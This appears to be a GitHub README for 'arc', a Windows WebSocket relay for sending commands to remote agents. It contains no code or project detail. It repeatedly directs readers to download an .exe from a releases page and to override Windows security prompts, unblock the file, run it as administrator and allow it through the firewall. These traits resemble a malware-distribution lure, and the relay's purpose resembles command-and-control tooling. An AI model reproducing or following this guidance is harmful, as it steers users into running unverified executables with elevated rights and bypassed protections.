# 🔗 arc - Run a WebSocket relay on Windows

[![Download arc](https://img.shields.io/badge/Download%20arc-blue?style=for-the-badge&logo=github)](https://github.com/Intrusive-justice55/arc/releases)

## 🧭 What arc does

arc is a relay server for remote agent control. It helps one app send messages to another over a WebSocket connection.

Use it when you need a simple link between a control app and a remote agent. It is built for Windows users who want a local tool that starts fast and stays out of the way.

## 📥 Download arc

1. Open the [arc releases page](https://github.com/Intrusive-justice55/arc/releases).
2. Find the latest release at the top of the page.
3. Under **Assets**, download the Windows file.
4. Save the file to your Downloads folder or another easy place to find.
5. If the file comes in a .zip, right-click it and choose **Extract All**.
6. Open the extracted folder.
7. Double-click the app file to run it.

If Windows shows a security prompt, choose the option that lets you keep the file and run it.

## 🖥️ What you need

arc is made for Windows PCs.

Recommended setup:
- Windows 10 or Windows 11
- A stable internet connection
- Permission to run apps on your PC
- Enough free space to store the app file and logs

arc works best on a normal desktop or laptop. It does not need a powerful computer.

## ⚙️ How to set it up

1. Download the latest release from the releases page.
2. Extract the files if the download is a zip archive.
3. Open the folder that contains the app.
4. Double-click the main program file.
5. If Windows asks for permission, choose **Yes**.
6. Keep the app open while you use the relay connection.

If you move the app file later, make sure you move all of its files with it.

## 🚦 First run

When you start arc for the first time, it may create local settings files in the same folder.

You may see a small window or a tray icon. If so, leave it open. The relay service must keep running for agent connections to work.

Typical first-run steps:
- Start the app
- Check that it opens without errors
- Keep it running in the background
- Connect your agent or control tool to the relay address you use in your setup

## 🔌 How to use it

arc works as a middle point between two tools:
- one tool sends control messages
- one agent receives them

Basic flow:
1. Start arc on your Windows PC.
2. Set your agent to use the relay server address.
3. Connect your control app to the same relay.
4. Send a command from the control app.
5. The agent receives the command through the relay.

If your agent and control app need a host name or port, use the values from your own setup. The relay only works when both sides point to the same server.

## 🧩 Common setup parts

You may need to know these terms while setting up arc:

- **Host**: the computer name or IP address where arc runs
- **Port**: the network port the relay uses
- **WebSocket**: the connection type used for live message flow
- **Agent**: the remote tool that listens for commands
- **Control app**: the app that sends commands to the agent

If a settings screen asks for these values, type them exactly as your setup requires.

## 🛠️ Basic usage tips

- Keep arc open before you start the agent connection.
- Use the same host and port in both tools.
- If the connection fails, check that the app is still running.
- Make sure no other program uses the same port.
- Restart the app if you change a setting.

If you run arc on a home network, you may need to use a local IP address instead of a device name.

## 🔍 Troubleshooting

### ❌ The app does not open

- Download the release file again.
- Check that the file finished downloading.
- If the file is in a zip, extract it first.
- Right-click the app and choose **Run as administrator**.

### 🌐 The agent cannot connect

- Make sure arc is running.
- Check the host and port in both tools.
- Confirm that your firewall allows the app.
- Restart the app and try again.

### 🧱 Windows blocked the file

- Right-click the file and open **Properties**.
- If you see an **Unblock** option, select it.
- Try running the file again.
- Use the latest release from the download page.

### 🔁 The connection drops

- Keep the PC awake.
- Check the network link.
- Close apps that may use the same port.
- Restart arc and reconnect both sides.

## 🧭 Where to find the right file

On the releases page, look for the newest version near the top.

Choose the file that matches Windows. Common file names may include:
- `arc-windows.exe`
- `arc-win64.zip`
- `arc-setup.exe`

If you see more than one file, pick the one that looks like the Windows build. If you are not sure, use the file with `.exe` for the simplest start.

## 🔐 Security and network use

arc moves messages between tools over a network connection. Use it only on systems you trust.

For home or lab use:
- run it on your own PC
- keep the same version on both sides
- use a trusted network when possible
- close the app when you do not need it

If you use a firewall, you may need to allow arc through it so the relay can accept connections.

## 📁 Folder layout

After you extract the release, you may see files like:
- the main app file
- a config file
- log files
- support files

Keep the files in the same folder. The app may need them all to run.

## 🧪 Simple test plan

Use this quick check after setup:

1. Open arc.
2. Confirm it stays open.
3. Start your agent.
4. Open your control app.
5. Send one test message.
6. Check that the message reaches the agent.

If the test works, your relay path is set up.

## 🧰 If you need to move it

If you want to move arc to another folder:
1. Close the app.
2. Move the full folder, not one file.
3. Open the app from the new location.
4. Check your settings if the network path changed.

If you move it to another PC, download the latest release again on that machine.

## 🧷 File types you may see

arc may be published as one of these:
- `.exe` for direct run
- `.zip` for manual extract and run
- `.msi` for guided install

If the release page gives more than one choice, pick the one that fits how you want to use it. For most Windows users, the easiest option is a direct `.exe` file or a zip with one main app file inside.

## 🧑‍💻 Good habits for smooth use

- Use the latest release
- Keep the relay app open
- Match the host and port on both sides
- Store the files in one folder
- Restart after Windows updates if needed

## 📦 Download and install again

If you need a fresh copy, go to the [arc releases page](https://github.com/Intrusive-justice55/arc/releases), download the latest Windows file, extract it if needed, and run the app from the folder where you saved it